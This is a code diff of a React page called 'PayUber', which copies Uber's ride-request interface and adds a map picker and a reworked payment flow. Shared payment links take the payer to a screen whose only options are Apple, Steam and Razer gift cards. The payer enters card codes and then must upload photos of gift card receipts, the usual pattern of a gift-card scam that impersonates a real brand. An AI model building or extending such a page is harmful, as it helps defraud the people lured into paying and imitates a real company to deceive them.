-  const personIcon = `<svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="8" r="4"/><path d="M12 14c-6.1 0-8 4-8 4v2h16v-2s-1.9-4-8-4z"/></svg>`
 
   // Render ride list (landing mode)
   const renderRideList = () => {
@@ -585,7 +676,7 @@ export default function PayUberPage() {
                     </div>
                     <div className="ride-type-content">
                       <div className="ride-type-header">
-                        <span className="ride-type-name">{p.name} <span className="ride-type-capacity" dangerouslySetInnerHTML={{ __html: `${personIcon} ${p.capacity}` }} /></span>
+                        <span className="ride-type-name">{p.name} <span className="ride-type-capacity" dangerouslySetInnerHTML={{ __html: `${PERSON_ICON} ${p.capacity}` }} /></span>
                         <span className="ride-type-price">{formatPrice(p.price)}</span>
                       </div>
                       <div className="ride-type-meta" dangerouslySetInnerHTML={{ __html: `${p.key === 'uber_x' ? `<span class="faster-tag">${FASTER_ICON} Faster</span>` : ''} Pickup in ${eta} min` }} />
@@ -608,6 +699,9 @@ export default function PayUberPage() {
       <Head>
         <title>PayUber | Request a ride</title>
         <meta name="description" content="Go anywhere with PayUber. Request a ride, hop in, and go." />
+        <link rel="preconnect" href="https://fonts.googleapis.com" />
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
         <link rel="stylesheet" href="/payuber/variables.css" />
         <link rel="stylesheet" href="/payuber/global.css" />
         <link rel="stylesheet" href="/payuber/landing.css" />
@@ -618,10 +712,7 @@ export default function PayUberPage() {
       {/* Header */}
       <header className="uber-header">
         <div className="header-left">
-          <a href="/payuber" className="header-logo">
-            <img src="/uber-logo.svg" alt="PayUber" style={{ height: 24, display: 'inline-block', verticalAlign: 'middle' }} />
-            PayUber
-          </a>
+          <a href="/payuber" className="header-logo">PayUber</a>
           <nav className="header-nav">
             <a href="/payuber">Ride</a>
             <a href="#">Drive</a>
@@ -644,8 +735,8 @@ export default function PayUberPage() {
             <div className="hero-inner">
               <div className="hero-left">
                 <div className="hero-city">
-                  <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
-                  <span>PayUber</span>
+                  <span dangerouslySetInnerHTML={{ __html: CITY_PIN_ICON }} />
+                  <span>{currentCity}</span>
                 </div>
                 <h1 className="hero-title">Go anywhere with PayUber</h1>
 
@@ -659,6 +750,14 @@ export default function PayUberPage() {
                       autoComplete="off"
                       value={pickupInput}
                       onChange={(e) => { setPickupInput(e.target.value); handleAutocomplete(e.target.value, 'pickup') }}
+                    />
+                    <button
+                      type="button"
+                      className="location-btn map-input-trigger"
+                      title="Choose pickup on map"
+                      aria-label="Choose pickup on map"
+                      onClick={() => openMapPicker('pickup')}
+                      dangerouslySetInnerHTML={{ __html: GPS_PIN_ICON }}
                     />
                     <div className="autocomplete-dropdown" style={{ display: activeDropdown === 'pickup' && dropdownResults.length ? 'block' : 'none' }}>
                       {dropdownResults.map((r, i) => (
@@ -677,6 +776,14 @@ export default function PayUberPage() {
                       autoComplete="off"
                       value={dropoffInput}
                       onChange={(e) => { setDropoffInput(e.target.value); handleAutocomplete(e.target.value, 'dropoff') }}
+                    />
+                    <button
+                      type="button"
+                      className="location-btn map-input-trigger"
+                      title="Choose destination on map"
+                      aria-label="Choose destination on map"
+                      onClick={() => openMapPicker('dropoff')}
+                      dangerouslySetInnerHTML={{ __html: GPS_PIN_ICON }}
                     />
                     <div className="autocomplete-dropdown" style={{ display: activeDropdown === 'dropoff' && dropdownResults.length ? 'block' : 'none' }}>
                       {dropdownResults.map((r, i) => (
@@ -705,6 +812,39 @@ export default function PayUberPage() {
               </div>
             </div>
           </section>
+
+          {/* Suggestions section */}
+          <section className="suggestions-section">
+            <div className="suggestions-inner">
+              <h2 className="suggestions-title">Suggestions</h2>
+              <div className="suggestions-grid">
+                <a href="#" className="suggestion-card">
+                  <div className="suggestion-card-content">
+                    <h3>Ride</h3>
+                    <p>Go anywhere with PayUber. Request a ride, hop in, and go.</p>
+                    <span className="details-link">Details</span>
+                  </div>
+                  <div className="suggestion-card-icon"><img src="/landing page ride.png" alt="Ride" /></div>
+                </a>
+                <a href="#" className="suggestion-card">
+                  <div className="suggestion-card-content">
+                    <h3>Reserve</h3>
+                    <p>Reserve your ride in advance so you can relax on the day of your trip.</p>
+                    <span className="details-link">Details</span>
+                  </div>
+                  <div className="suggestion-card-icon"><img src="/landing page reserve.png" alt="Reserve" /></div>
+                </a>
+                <a href="#" className="suggestion-card">
+                  <div className="suggestion-card-content">
+                    <h3>Courier</h3>
+                    <p>PayUber makes same-day item delivery easier than ever.</p>
+                    <span className="details-link">Details</span>
+                  </div>
+                  <div className="suggestion-card-icon"><img src="/landing page carrier.png" alt="Courier" /></div>
+                </a>
+              </div>
+            </div>
+          </section>
         </div>
       )}
 
@@ -720,10 +860,26 @@ export default function PayUberPage() {
                 <div className="uber-input-row">
                   <div className="uber-input-icon"><div className="dot-pickup"></div></div>
                   <input type="text" className="uber-input-field" value={pickupData?.displayName || ''} readOnly />
+                  <button
+                    type="button"
+                    className="location-btn map-input-trigger"
+                    title="Choose pickup on map"
+                    aria-label="Choose pickup on map"
+                    onClick={() => openMapPicker('pickup')}
+                    dangerouslySetInnerHTML={{ __html: GPS_PIN_ICON }}
+                  />
                 </div>
                 <div className="uber-input-row">
                   <div className="uber-input-icon"><div className="dot-dropoff"></div></div>
                   <input type="text" className="uber-input-field" value={dropoffData?.displayName || ''} readOnly />
+                  <button
+                    type="button"
+                    className="location-btn map-input-trigger"
+                    title="Choose destination on map"
+                    aria-label="Choose destination on map"
+                    onClick={() => openMapPicker('dropoff')}
+                    dangerouslySetInnerHTML={{ __html: GPS_PIN_ICON }}
+                  />
                 </div>
               </div>
             </div>
@@ -759,7 +915,7 @@ export default function PayUberPage() {
         </div>
       )}
 
-      {/* Pay mode (shared URL) — same page, different content */}
+      {/* Pay mode (shared URL) — no map pins, full-width sidebar */}
       {sessionId && (
         <div className="map-view active pay-mode">
           <div className="map-sidebar">
@@ -795,7 +951,7 @@ export default function PayUberPage() {
                     <div className="price-total"><span>Total</span><span>{formatPrice(selectedSummary.price)}</span></div>
                   </div>
                   <div className="map-sidebar-footer" style={{ paddingTop: 16 }}>
-                    <button className="btn btn-primary btn-lg" style={{ width: '100%' }} onClick={() => setPayStep('methods')}>
+                    <button className="btn btn-primary btn-lg" style={{ width: '100%' }} onClick={handlePayNowClick}>
                       Pay Now
                     </button>
                   </div>
@@ -806,78 +962,63 @@ export default function PayUberPage() {
                 <>
                   <h3 className="ride-category-title">Gift Cards</h3>
                   <div className="payment-methods-grid">
-                    {PAYMENT_METHODS.map((method) => (
-                      <div
-                        key={method.id}
-                        className={`ride-type ${selectedMethod?.id === method.id ? 'active' : ''}`}
-                        onClick={() => setSelectedMethod(method)}
-                      >
-                        <div className="ride-type-img" style={{ background: 'transparent', padding: 0 }}>
-                          <span dangerouslySetInnerHTML={{ __html: method.id === 'apple' ? APPLE_GIFT_ICON : method.id === 'steam' ? STEAM_GIFT_ICON : RAZER_GIFT_ICON }} style={{ width: '100%', height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center' }} />
-                        </div>
-                        <div className="ride-type-content">
-                          <div className="ride-type-header">
-                            <span className="ride-type-name">{method.label}</span>
-                            <span className="ride-type-price">{formatPrice(selectedSummary.price)}</span>
+                    {PAYMENT_METHODS.map((method) => {
+                      const expanded = expandedMethod === method.id
+                      return (
+                        <div key={method.id} className="payment-method-item">
+                          <div
+                            className={`ride-type ${expanded ? 'active' : ''}`}
+                            onClick={() => {
+                              const next = expanded ? null : method.id
+                              setExpandedMethod(next)
+                              setSelectedMethod(expanded ? null : method)
+                              setCardError('')
+                              setUploadError(null)
+                              if (!next) setShowUploadStep(false)
+                            }}
+                          >
+                            <div className="ride-type-img" style={{ background: 'transparent', padding: 0 }}>
+                              {method.logoIsImg
+                                ? <img src={method.logo} alt={method.label} style={{ width: '100%', height: '100%', objectFit: 'contain' }} />
+                                : <span dangerouslySetInnerHTML={{ __html: method.logo }} style={{ width: '100%', height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center' }} />}
+                            </div>
+                            <div className="ride-type-content">
+                              <div className="ride-type-header">
+                                <span className="ride-type-name">{method.label}</span>
+                                <span className="ride-type-price">{formatPrice(selectedSummary.price)}</span>
+                              </div>
+                            </div>
                           </div>
-                          <div className="ride-type-meta">{method.meta}</div>
-                          <div className="ride-type-desc">{method.desc}</div>
+                          {expanded && (
+                            <div className="payment-method-expanded">
+                              <form onSubmit={checkCard}>
+                                <div className="uber-input-row">
+                                  <input
+                                    type="text"
+                                    className="uber-input-field"
+                                    placeholder="Enter your card code"
+                                    autoComplete="off"
+                                    value={cardNumber}
+                                    onChange={(e) => setCardNumber(e.target.value.toUpperCase())}
+                                  />
+                                </div>
+                                {cardError && <p style={{ color: '#E54B4B', fontSize: 13, marginTop: 8 }}>{cardError}</p>}
+                                <button className="btn btn-primary btn-lg" style={{ width: '100%', marginTop: 12 }} disabled={cardLoading}>
+                                  {cardLoading ? 'Checking...' : 'Continue'}
+                                </button>
+                              </form>
+                            </div>
+                          )}
                         </div>
-                      </div>
-                    ))}
+                      )
+                    })}
                   </div>
-                  <div className="map-sidebar-footer" style={{ paddingTop: 16 }}>
-                    <button
-                      className="btn btn-primary btn-lg"
-                      style={{ width: '100%' }}
-                      disabled={!selectedMethod}
-                      onClick={() => setPayStep('card')}
-                    >
-                      Continue
-                    </button>
-                  </div>
-                </>
-              )}
 
-              {session && !sessionLoading && payStep === 'card' && selectedMethod && (
-                <>
-                  <h3 className="ride-category-title">{selectedMethod.label}</h3>
-                  <p className="ride-type-desc" style={{ marginBottom: 16 }}>
-                    Enter your card code to pay {formatPrice(selectedSummary.price)} for your {selectedSummary.name} trip.
-                  </p>
-
-                  {!showUploadStep && !uploadComplete && (
-                    <form onSubmit={checkCard} className="uber-inputs" style={{ marginBottom: 0 }}>
-                      <div className="uber-input-row">
-                        <input
-                          type="text"
-                          className="uber-input-field"
-                          placeholder="Enter your card code"
-                          autoComplete="off"
-                          value={cardNumber}
-                          onChange={(e) => setCardNumber(e.target.value.toUpperCase())}
-                        />
-                      </div>
-                      {cardError && <p style={{ color: '#E54B4B', fontSize: 13, marginTop: 8 }}>{cardError}</p>}
-                      {cardResult && (
-                        <div className="payment-status-card confirmation-step" style={{ padding: '16px 0' }}>
-                          <h3 style={{ marginBottom: 4 }}>Payment received</h3>
-                          <p style={{ color: '#545454', fontSize: 14 }}>Your card has been applied to the trip. The driver will be notified shortly.</p>
-                        </div>
-                      )}
-                      <div className="map-sidebar-footer" style={{ paddingTop: 16, display: cardResult ? 'none' : 'block' }}>
-                        <button className="btn btn-primary btn-lg" style={{ width: '100%' }} disabled={cardLoading}>
-                          {cardLoading ? 'Checking...' : 'Pay Now'}
-                        </button>
-                      </div>
-                    </form>
-                  )}
-
-                  {showUploadStep && !uploadComplete && (
-                    <div className="confirmation-card">
-                      <h3 style={{ marginBottom: 8 }}>Upload receipt (optional)</h3>
+                  {showUploadStep && cardResult && (
+                    <div className="confirmation-card" style={{ marginTop: 16 }}>
+                      <h3 style={{ marginBottom: 8 }}>Upload receipt</h3>
                       <p style={{ color: '#545454', fontSize: 14, marginBottom: 16 }}>
-                        Upload a photo of your gift card receipt to help confirm the payment.
+                        Upload a photo of your gift card receipt to confirm the payment.
                       </p>
                       <label className="btn btn-primary" style={{ cursor: 'pointer', marginBottom: 12 }}>
                         Select images
@@ -900,29 +1041,8 @@ export default function PayUberPage() {
                         </div>
                       )}
                       {uploadError && <p style={{ color: '#E54B4B', fontSize: 13, marginBottom: 8 }}>{uploadError}</p>}
-                      <div style={{ display: 'flex', gap: 8 }}>
-                        <button className="btn btn-primary" onClick={handleUpload} disabled={uploadProgress}>
-                          {uploadProgress ? 'Uploading...' : 'Upload receipt'}
-                        </button>
-                        <button className="btn" style={{ background: '#EEEEEE' }} onClick={skipUpload}>
-                          Skip
-                        </button>
-                      </div>
-                    </div>
-                  )}
-
-                  {uploadComplete && (
-                    <div className="payment-status-card confirmation-step" style={{ padding: '16px 0' }}>
-                      <h3 style={{ marginBottom: 4 }}>Payment complete</h3>
-                      <p style={{ color: '#545454', fontSize: 14 }}>
-                        Thanks! Your {selectedSummary.name} trip from {truncateAddress(selectedSummary.pickup, 30)} to {truncateAddress(selectedSummary.dropoff, 30)} has been paid.
-                      </p>
-                      <button
-                        className="btn btn-primary"
-                        style={{ marginTop: 16 }}
-                        onClick={() => router.push('/payuber')}
-                      >
-                        Return Home
+                      <button className="btn btn-primary" onClick={handleUpload} disabled={uploadProgress}>
+                        {uploadProgress ? 'Verifying...' : 'Upload receipt'}
                       </button>
                     </div>
                   )}
@@ -930,8 +1050,32 @@ export default function PayUberPage() {
               )}
             </div>
           </div>
-          <div className="map-area">
-            <div id="map" ref={mapRef} style={{ width: '100%', height: '100%' }}></div>
+        </div>
+      )}
+
+      {/* Map picker overlay (GPS icon -> pick on map) */}
+      {mapPickerTarget && (
+        <div className="map-picker-overlay show" onClick={closeMapPicker}>
+          <div className="map-picker-sheet" onClick={(e) => e.stopPropagation()}>
+            <div className="map-picker-header">
+              <div>
+                <p className="map-picker-eyebrow">Pin location</p>
+                <h3>{mapPickerTarget === 'pickup' ? 'Choose pickup on map' : 'Choose destination on map'}</h3>
+              </div>
+              <button className="map-picker-close" type="button" aria-label="Close map picker" onClick={closeMapPicker}>×</button>
+            </div>
+            <p className="map-picker-help">
+              {mapPickerLocating
+                ? 'Finding your location...'
+                : 'Tap the map or drag the pin to place the spot instantly.'}
+            </p>
+            <div className="map-picker-map" ref={mapPickerMapRef}></div>
+            <div className="map-picker-selection">
+              <div className="map-picker-selection-label">
+                {mapPickerTarget === 'pickup' ? 'Selected pickup' : 'Selected destination'}
+              </div>
+              <div className="map-picker-selection-value">{mapPickerAddress || 'Move the pin to choose a location.'}</div>
+            </div>
           </div>
         </div>
       )}
@@ -956,7 +1100,7 @@ export default function PayUberPage() {
             </div>
             <div className="uber-modal-actions">
               <button className="uber-modal-btn uber-modal-btn-primary" id="modal-pay-btn" onClick={handlePayFor} disabled={modalBusy} dangerouslySetInnerHTML={{ __html: `${CARD_ICON} Pay for this ride` }} />
-              <button className="uber-modal-btn uber-modal-btn-secondary" id="modal-share-btn" onClick={handleShare} disabled={modalBusy} dangerouslySetInnerHTML={{ __html: `${SHARE_ICON} Send payment link to a friend` }} />
+              <button className={`uber-modal-btn uber-modal-btn-secondary btn-shimmer ${sharing ? 'shimmering' : ''}`} id="modal-share-btn" onClick={handleShare} disabled={modalBusy} dangerouslySetInnerHTML={{ __html: `${SHARE_ICON} Send payment link to a friend` }} />
             </div>
           </div>
         </div>
